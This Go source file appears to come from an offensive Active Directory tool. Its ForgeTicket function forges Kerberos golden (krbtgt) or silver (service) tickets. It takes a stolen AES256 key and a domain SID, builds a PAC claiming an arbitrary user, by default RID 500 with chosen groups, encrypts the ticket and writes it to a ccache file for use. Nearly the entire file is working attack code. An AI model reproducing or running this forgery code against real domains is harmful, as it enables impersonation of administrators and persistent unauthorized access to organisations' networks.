package krb

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/jcmturner/gofork/encoding/asn1"
	"github.com/jcmturner/gokrb5/v8/asn1tools"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/adtype"
	"github.com/jcmturner/gokrb5/v8/iana/asnAppTag"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/iana/flags"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// ForgeOptions is a golden (krbtgt) or silver (service) AES ticket.
type ForgeOptions struct {
	Domain    string
	User      string
	SID       string // domain SID S-1-5-21-… (no RID)
	RID       uint32
	Groups    []uint32
	AESKeyHex string
	KVNO      int
	SPN       string // empty → golden krbtgt/REALM; else silver
	Dir       string
}

// ForgeTicket builds an AES256 TGT (golden) or service ticket (silver) with a PAC.
func ForgeTicket(opts ForgeOptions) (TicketMeta, error) {
	if opts.Domain == "" || opts.User == "" || opts.SID == "" || opts.AESKeyHex == "" {
		return TicketMeta{}, fmt.Errorf("--domain --user --sid --aes-file required")
	}
	raw, err := parseAES256Key(opts.AESKeyHex)
	if err != nil {
		return TicketMeta{}, err
	}
	if opts.RID == 0 {
		opts.RID = 500
	}
	if opts.KVNO <= 0 {
		opts.KVNO = 2
	}
	et, err := crypto.GetEtype(etypeID.AES256_CTS_HMAC_SHA1_96)
	if err != nil {
		return TicketMeta{}, err
	}
	session, err := types.GenerateEncryptionKey(et)
	if err != nil {
		return TicketMeta{}, err
	}
	realm := Realm(opts.Domain)
	user := samOnly(opts.User)
	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, user)
	var sname types.PrincipalName
	src := "golden"
	if spn := strings.TrimSpace(opts.SPN); spn != "" {
		sname, err = parseSPN(spn)
		if err != nil {
			return TicketMeta{}, err
		}
		src = "silver"
	} else {
		sname = types.NewPrincipalName(nametype.KRB_NT_SRV_INST, "krbtgt/"+realm)
	}
	key := types.EncryptionKey{KeyType: etypeID.AES256_CTS_HMAC_SHA1_96, KeyValue: raw}
	now := Now()
	pac, err := BuildPAC(PACUser{
		User:      user,
		Domain:    opts.Domain,
		DomainSID: strings.TrimSpace(opts.SID),
		RID:       opts.RID,
		Groups:    opts.Groups,
		AuthTime:  now,
	}, key)
	if err != nil {
		return TicketMeta{}, err
	}
	ad, err := wrapPAC(pac)
	if err != nil {
		return TicketMeta{}, err
	}
	fl := types.NewKrbFlags()
	types.SetFlags(&fl, []int{flags.Forwardable, flags.Renewable, flags.PreAuthent})
	etp := messages.EncTicketPart{
		Flags:             fl,
		Key:               session,
		CRealm:            realm,
		CName:             cname,
		Transited:         messages.TransitedEncoding{},
		AuthTime:          now.Add(-10 * time.Minute),
		StartTime:         now.Add(-10 * time.Minute),
		EndTime:           now.Add(10 * time.Hour),
		RenewTill:         now.Add(7 * 24 * time.Hour),
		AuthorizationData: ad,
	}
	plain, err := asn1.Marshal(etp)
	if err != nil {
		return TicketMeta{}, fmt.Errorf("EncTicketPart: %w", err)
	}
	plain = asn1tools.AddASNAppTag(plain, asnAppTag.EncTicketPart)
	ed, err := crypto.GetEncryptedData(plain, key, uint32(keyusage.KDC_REP_TICKET), opts.KVNO)
	if err != nil {
		return TicketMeta{}, err
	}
	tkt := messages.Ticket{
		TktVNO:  5,
		Realm:   realm,
		SName:   sname,
		EncPart: ed,
	}
	tktBytes, err := tkt.Marshal()
	if err != nil {
		return TicketMeta{}, err
	}
	cc, err := WriteCCache(CCacheCred{
		ClientRealm: realm,
		Client:      cname.NameString,
		ServerRealm: realm,
		Server:      sname.NameString,
		KeyType:     session.KeyType,
		Key:         session.KeyValue,
		AuthTime:    etp.AuthTime,
		StartTime:   etp.StartTime,
		EndTime:     etp.EndTime,
		RenewTill:   etp.RenewTill,
		Flags:       bitStringUint32(fl.Bytes),
		Ticket:      tktBytes,
	})
	if err != nil {
		return TicketMeta{}, err
	}
	dir := opts.Dir
	if dir == "" {
		dir = DefaultTicketDir()
	}
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return TicketMeta{}, err
	}
	id, err := newTicketID()
	if err != nil {
		return TicketMeta{}, err
	}
	ccPath := filepath.Join(dir, id+".ccache")
	if err := os.WriteFile(ccPath, cc, 0o600); err != nil {
		return TicketMeta{}, err
	}
	meta := TicketMeta{
		ID:        id,
		Principal: user,
		Realm:     realm,
		Server:    strings.Join(sname.NameString, "/") + "@" + realm,
		EType:     session.KeyType,
		End:       etp.EndTime,
		Source:    src,
		CCache:    ccPath,
	}
	if err := writeMeta(dir, meta); err != nil {
		return TicketMeta{}, err
	}
	return meta, nil
}

func wrapPAC(pac []byte) (types.AuthorizationData, error) {
	inner := types.AuthorizationData{
		{ADType: adtype.ADWin2KPAC, ADData: pac},
	}
	b, err := asn1.Marshal(inner)
	if err != nil {
		return nil, err
	}
	return types.AuthorizationData{
		{ADType: adtype.ADIfRelevant, ADData: b},
	}, nil
}

// ParseAES256KeyHex is exported for CLI tests.
func ParseAES256KeyHex(h string) ([]byte, error) {
	return parseAES256Key(h)
}
